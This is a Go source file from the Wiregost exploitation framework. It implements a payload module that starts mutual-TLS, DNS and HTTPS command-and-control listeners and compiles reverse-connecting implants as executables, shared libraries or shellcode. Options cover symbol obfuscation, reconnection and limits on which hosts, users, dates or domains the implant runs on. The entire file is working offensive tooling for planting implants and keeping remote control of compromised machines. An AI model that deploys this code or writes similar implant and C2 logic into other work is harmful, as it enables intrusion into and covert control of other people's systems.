// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

// CHANGE THE NAME OF THE PACKAGE WITH THE NAME OF YOUR MODULE/DIRECTORY
package reverse_multi_protocol

import (
	"errors"
	"fmt"
	"strconv"
	"strings"
	"sync"

	"github.com/evilsocket/islazy/fs"
	"github.com/evilsocket/islazy/tui"
	consts "github.com/maxlandon/wiregost/client/constants"
	pb "github.com/maxlandon/wiregost/protobuf/client"
	"github.com/maxlandon/wiregost/server/c2"
	"github.com/maxlandon/wiregost/server/core"
	"github.com/maxlandon/wiregost/server/generate"
	"github.com/maxlandon/wiregost/server/log"
	"github.com/maxlandon/wiregost/server/module"
)

// [ Base Methods ] ------------------------------------------------------------------------//

// ReverseMulti - A single stage MTLS implant
type ReverseMulti struct {
	*module.Module
}

// New - Instantiates a reverse MTLS module, empty.
func New() *ReverseMulti {
	mod := &ReverseMulti{&module.Module{}}
	mod.Path = []string{"payload/multi/single/reverse_multi_protocol"}
	return mod
}

var modLog = log.ServerLogger("payload/multi/single/reverse_multi_protocol", "server")

// [ Module Methods ] ------------------------------------------------------------------------//

// Run - Module entrypoint. ** DO NOT ERASE **
func (s *ReverseMulti) Run(command string) (result string, err error) {

	action := strings.Split(command, " ")[0]

	switch action {
	case "run":
		return s.CompileImplant()
	case "to_listener":
		return s.toListener()
	case "parse_profile":
		return s.parseProfile(command)
	case "to_profile":
		return s.generateProfile(command)
	}
	return "", nil
}

func (s *ReverseMulti) CompileImplant() (result string, err error) {
	c, err := s.ToGhostConfig()
	if err != nil {
		return "", err
	}

	go generate.CompileGhost(*c)

	return fmt.Sprintf("Started compiling multi-protocol implant"), nil
}

func (s *ReverseMulti) toListener() (result string, err error) {

	// MTLS ---------------------------------------------------//
	host := s.Options["MTLSLHost"].Value
	portUint, _ := strconv.Atoi(s.Options["MTLSLPort"].Value)
	port := uint16(portUint)

	mtlsResult := ""
	var mtlsError error

	// If values are set, start MTLS listener
	if (host != "") && (s.Options["MTLSLPort"].Value != "") {

		ln, err := c2.StartMutualTLSListener(host, port)
		if err != nil {
			mtlsError = err
		}

		job := &core.Job{
			ID:          core.GetJobID(),
			Name:        "mTLS",
			Description: "Mutual TLS listener",
			Protocol:    "tcp",
			Port:        port,
			JobCtrl:     make(chan bool),
		}

		go func() {
			<-job.JobCtrl
			modLog.Infof("Stopping mTLS listener (%d) ...", job.ID)
			ln.Close() // Kills listener GoRoutines in startMutualTLSListener() but NOT connections

			core.Jobs.RemoveJob(job)

			core.EventBroker.Publish(core.Event{
				Job:       job,
				EventType: consts.StoppedEvent,
			})
		}()

		core.Jobs.AddJob(job)

		mtlsResult = fmt.Sprintf("Reverse Mutual TLS listener started at %s:%d \n", host, port)

	}

	// DNS -------------------------------------------------//
	// Listener domains
	domains := strings.Split(s.Options["DomainsDNSListener"].Value, ",")

	dnsResult := ""

	// If DNS domains are set, start listener
	if (len(domains) >= 1 && (domains[0] != "")) || ((len(domains) == 1) && (domains[0] != "")) {

		for _, domain := range domains {
			if !strings.HasSuffix(domain, ".") {
				domain += "."
			}
		}

		// Implant canaries
		enableCanaries := true
		if s.Options["DisableCanaries"].Value == "true" {
			enableCanaries = false
		}

		server := c2.StartDNSListener(domains, enableCanaries)
		description := fmt.Sprintf("%s (canaries %v)", strings.Join(domains, " "), enableCanaries)

		job := &core.Job{
			ID:          core.GetJobID(),
			Name:        "dns",
			Description: description,
			Protocol:    "udp",
			Port:        53,
			JobCtrl:     make(chan bool),
		}

		go func() {
			<-job.JobCtrl
			modLog.Infof("Stopping DNS listener (%d) ...", job.ID)
			server.Shutdown()

			core.Jobs.RemoveJob(job)

			core.EventBroker.Publish(core.Event{
				Job:       job,
				EventType: consts.StoppedEvent,
			})
		}()

		core.Jobs.AddJob(job)

		// There is no way to call DNS's ListenAndServe() without blocking
		// but we also need to check the error in the case the server
		// fails to start at all, so we setup all the Job mechanics
		// then kick off the server and if it fails we kill the job
		// ourselves.
		go func() {
			err := server.ListenAndServe()
			if err != nil {
				modLog.Errorf("DNS listener error %v", err)
				job.JobCtrl <- true
			}
		}()

		dnsResult = fmt.Sprintf("%s[*]%s Reverse DNS listener started with parent domain(s) %v...\n", tui.GREEN, tui.RESET, domains)
	}

	// HTTPS ---------------------------------------------//
	host = s.Options["HTTPLHost"].Value
	portUint, _ = strconv.Atoi(s.Options["HTTPLPort"].Value)
	port = uint16(portUint)
	addr := fmt.Sprintf("%s:%d", host, port)
	domain := s.Options["LimitResponseDomain"].Value
	website := s.Options["Website"].Value
	letsEncrypt := false
	if s.Options["LetsEncrypt"].Value == "true" {
		letsEncrypt = true
	}

	httpsResult := ""
	var httpError error

	// If values are set, start HTTPS listener
	if (host != "") && (s.Options["HTTPLPort"].Value != "") {

		certFile, _ := fs.Expand(s.Options["Certificate"].Value)
		keyFile, _ := fs.Expand(s.Options["Key"].Value)
		cert, key, err := getLocalCertificatePair(certFile, keyFile)
		if err != nil {
			return "", errors.New(fmt.Sprintf("Failed to load local certificate %v", err))
		}

		conf := &c2.HTTPServerConfig{
			Addr:    addr,
			LPort:   port,
			Secure:  true,
			Domain:  domain,
			Website: website,
			Cert:    cert,
			Key:     key,
			ACME:    letsEncrypt,
		}

		server := c2.StartHTTPSListener(conf)
		if server == nil {
			httpError = errors.New("HTTP Server instantiation failed")
		}

		job := &core.Job{
			ID:          core.GetJobID(),
			Name:        "https",
			Description: fmt.Sprintf("HTTPS C2 server (https for domain %s)", conf.Domain),
			Protocol:    "tcp",
			Port:        port,
			JobCtrl:     make(chan bool),
		}

		core.Jobs.AddJob(job)
		cleanup := func(err error) {
			server.Cleanup()
			core.Jobs.RemoveJob(job)
			core.EventBroker.Publish(core.Event{
				Job:       job,
				EventType: consts.StoppedEvent,
				Err:       err,
			})
		}
		once := &sync.Once{}

		go func() {
			var err error
			if server.Conf.ACME {
				err = server.HTTPServer.ListenAndServeTLS("", "") // ACME manager pulls the certs under the hood
			} else {
				err = listenAndServeTLS(server.HTTPServer, conf.Cert, conf.Key)
			}
			if err != nil {
				modLog.Errorf("HTTPS listener error %v", err)
				once.Do(func() { cleanup(err) })
				job.JobCtrl <- true // Cleanup other goroutine
			}

		}()

		go func() {
			<-job.JobCtrl
			once.Do(func() { cleanup(nil) })
		}()

		httpsResult = fmt.Sprintf("%s[*]%s Reverse HTTPS listener started at %s:%d", tui.GREEN, tui.RESET, host, port)
	}

	totalResult := fmt.Sprintf(mtlsResult + dnsResult + httpsResult)

	if mtlsError != nil {
		return "", mtlsError
	} else if httpError != nil {
		return mtlsResult, httpError
	} else {
		return totalResult, nil
	}
}

func (s *ReverseMulti) parseProfile(name string) (result string, err error) {
	profileName := strings.Split(name, " ")[1]

	profile, err := generate.ProfileByName(profileName)
	if err != nil {
		return "", err
	}

	// DNS C2
	if profile.DNSc2Enabled {
		urls := []string{}
		for _, d := range profile.C2 {
			if strings.HasPrefix(d.URL, "dns") {
				url := strings.TrimPrefix(d.URL, "dns://")
				urls = append(urls, url)
			}
		}
		s.Options["DomainsDNS"].Value = strings.Join(urls, ",")
	}

	// HTTP C2
	if profile.HTTPc2Enabled {
		urls := []string{}
		for _, d := range profile.C2 {
			if strings.HasPrefix(d.URL, "https") {
				url := strings.TrimPrefix(d.URL, "https://")
				urls = append(urls, url)
			}
		}
		s.Options["DomainsHTTP"].Value = strings.Join(urls, ",")
	}

	// MTLS C2
	if profile.MTLSc2Enabled {
		urls := []string{}
		for _, d := range profile.C2 {
			if strings.HasPrefix(d.URL, "mtls") {
				url := strings.TrimPrefix(d.URL, "mtls://")
				urls = append(urls, url)
			}
		}
		s.Options["DomainsMTLS"].Value = strings.Join(urls, ",")
	}

	// Canaries
	if len(profile.CanaryDomains) != 1 {
		domains := []string{}
		for _, d := range profile.CanaryDomains {
			domains = append(domains, d)
		}
		s.Options["Canaries"].Value = strings.Join(domains, ",")
	}

	// Format
	switch profile.Format {
	case 0:
		s.Options["Format"].Value = "shared"
	case 1:
		s.Options["Format"].Value = "shellcode"
	case 2:
		s.Options["Format"].Value = "exe"
	}

	// Other fields
	s.Options["Arch"].Value = profile.GOARCH
	s.Options["OS"].Value = profile.GOOS
	s.Options["MaxErrors"].Value = strconv.Itoa(profile.MaxConnectionErrors)
	s.Options["ObfuscateSymbols"].Value = strconv.FormatBool(profile.ObfuscateSymbols)
	s.Options["Debug"].Value = strconv.FormatBool(profile.Debug)
	s.Options["LimitHostname"].Value = profile.LimitHostname
	s.Options["LimitUsername"].Value = profile.LimitUsername
	s.Options["LimitDatetime"].Value = profile.LimitDatetime
	s.Options["LimitDomainJoined"].Value = strconv.FormatBool(profile.LimitDomainJoined)
	s.Options["ReconnectInterval"].Value = strconv.Itoa(profile.ReconnectInterval)

	return fmt.Sprintf("Profile %s parsed", profile.Name), nil
}

func (s *ReverseMulti) generateProfile(name string) (result string, err error) {
	profileName := strings.Split(name, " ")[1]

	c, err := s.ToGhostConfig()
	if err != nil {
		return "", err
	}

	// Save profile
	c.Name = profileName
	if 0 < len(c.Name) && c.Name != "." {
		modLog.Infof("Saving new profile with name %#v", c.Name)
		err = generate.ProfileSave(c.Name, c)
	} else {
		err = errors.New("Invalid profile name")
		return "", err
	}

	return fmt.Sprintf("Saved reverse multi-protocol implant profile with name %#v", c.Name), nil
}

func (s *ReverseMulti) ToGhostConfig() (c *generate.GhostConfig, err error) {

	c = &generate.GhostConfig{}

	// OS
	targetOS := s.Options["OS"].Value
	if targetOS == "mac" || targetOS == "macos" || targetOS == "m" || targetOS == "osx" {
		targetOS = "darwin"
	}
	if targetOS == "win" || targetOS == "w" || targetOS == "shit" {
		targetOS = "windows"
	}
	if targetOS == "unix" || targetOS == "l" {
		targetOS = "linux"
	}

	// Arch
	arch := s.Options["Arch"].Value
	if arch == "x64" || strings.HasPrefix(arch, "64") {
		arch = "amd64"
	}
	if arch == "x86" || strings.HasPrefix(arch, "32") {
		arch = "386"
	}

	// Format
	var outputFormat pb.GhostConfig_OutputFormat
	format := s.Options["Format"].Value
	switch format {
	case "shared":
		outputFormat = pb.GhostConfig_SHARED_LIB
		c.IsSharedLib = true
	case "shellcode":
		outputFormat = pb.GhostConfig_SHELLCODE
		c.IsSharedLib = true
	case "exe":
		outputFormat = pb.GhostConfig_EXECUTABLE
		c.IsSharedLib = false
	default:
		outputFormat = pb.GhostConfig_EXECUTABLE
		c.IsSharedLib = false
	}

	// DNS C2
	c2s := generate.ParseDNSc2ToStruct(s.Options["DomainsDNS"].Value)
	// HTTP C2
	c2s = append(c2s, generate.ParseHTTPc2ToStruct(s.Options["DomainsHTTP"].Value)...)
	// MTLS C2
	c2s = append(c2s, generate.ParseMTLSc2ToStruct(s.Options["DomainsMTLS"].Value)...)

	if len(c2s) == 0 {
		return nil, errors.New("You must specify at least one C2 endpoint (DNS, HTTP(S) or mTLS)")
	}

	// Canary Domains
	canaries := strings.Split(s.Options["Canaries"].Value, ",")
	if canaries[0] != "" {
		c.CanaryDomains = strings.Split(s.Options["Canaries"].Value, ",")
	}

	// Populate fields
	c.GOOS = targetOS
	c.GOARCH = arch
	c.Format = outputFormat
	c.C2 = c2s
	c.DNSc2Enabled = true
	c.HTTPc2Enabled = true
	c.MTLSc2Enabled = true
	c.Debug, _ = strconv.ParseBool(s.Options["Debug"].Value)
	c.ObfuscateSymbols, _ = strconv.ParseBool(s.Options["ObfuscateSymbols"].Value)
	c.MaxConnectionErrors, _ = strconv.Atoi(s.Options["MaxErrors"].Value)
	c.ReconnectInterval, _ = strconv.Atoi(s.Options["ReconnectInterval"].Value)
	c.LimitDomainJoined, _ = strconv.ParseBool(s.Options["LimitDomainJoined"].Value)
	c.LimitHostname = s.Options["LimitHostname"].Value
	c.LimitUsername = s.Options["LimitUsername"].Value
	c.LimitDatetime = s.Options["LimitDatetime"].Value

	return c, nil
}
